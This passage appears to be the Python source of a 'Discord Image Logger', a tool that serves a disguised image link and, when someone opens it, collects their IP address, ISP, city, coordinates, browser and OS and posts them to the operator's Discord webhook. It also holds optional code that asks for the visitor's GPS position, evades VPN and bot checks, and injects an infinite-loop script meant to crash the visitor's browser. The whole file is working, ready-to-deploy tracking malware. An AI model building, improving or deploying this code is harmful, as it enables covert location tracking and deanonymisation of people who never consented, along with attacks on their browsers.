JGOmC2KKGuGhAJUMUQUBVGFAwB4AU4rTLhyuSPRselSUJE0qx2XBboAdgT3ZPcKmurZ4iYpAA6nzuh3x0DDqN6rympVlKNqXYr02B+B2oQmGrFxYSIkcjLhZMlDkbgYzt1HUdarscs2fE1zWcerpQhdztjH508PnboPDr0quZDtUwoRQThSrgrlCVf/Z", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
